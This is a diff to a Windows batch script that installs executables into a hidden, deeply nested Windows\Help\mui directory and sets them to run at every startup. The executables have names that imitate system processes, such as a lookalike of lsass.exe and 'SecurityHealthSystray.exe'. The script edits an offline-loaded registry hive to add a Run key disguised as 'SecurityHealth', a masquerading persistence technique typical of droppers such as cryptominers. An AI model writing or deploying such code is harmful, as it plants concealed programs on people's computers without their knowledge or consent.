@@ -38,18 +38,17 @@ mkdir "!WINLETTER!\Windows\Help\mui"
 mkdir "!WINLETTER!\Windows\Help\mui\0563"
 mkdir "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic"
 copy Isass.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
-copy starter.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy WMIHost.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy wuasrv.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy 5633 "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
-copy nssm.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy SecurityHealthSystray.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
+copy wuasrvs.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 
 
 :: StartupFolder
 reg load HKLM\zSOFTWARE "!WINLETTER!\Windows\System32\Config\SOFTWARE"
 reg add HKLM\zSOFTWARE\Microsoft\Windows\CurrentVersion\Run /f
-reg add HKLM\zSOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /t REG_EXPAND_SZ /d C:\Windows\Help\mui\0563\DIAgnostic /f
+reg add HKLM\zSOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /t REG_EXPAND_SZ /d C:\Windows\Help\mui\0563\DIAgnostic\SecurityHealthSystray.exe /f
 reg unload HKLM\zSOFTWARE
 
 
